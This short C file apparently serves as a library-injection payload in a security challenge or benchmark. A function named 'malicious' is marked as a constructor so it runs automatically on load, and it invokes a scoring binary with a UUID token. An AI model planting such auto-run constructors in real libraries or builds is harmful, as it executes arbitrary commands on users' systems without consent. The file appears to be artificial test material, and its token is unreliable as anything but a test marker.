#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
  system("/usr/local/bin/score b1628c23-b756-44a2-8a91-fe21d46d53a3");
}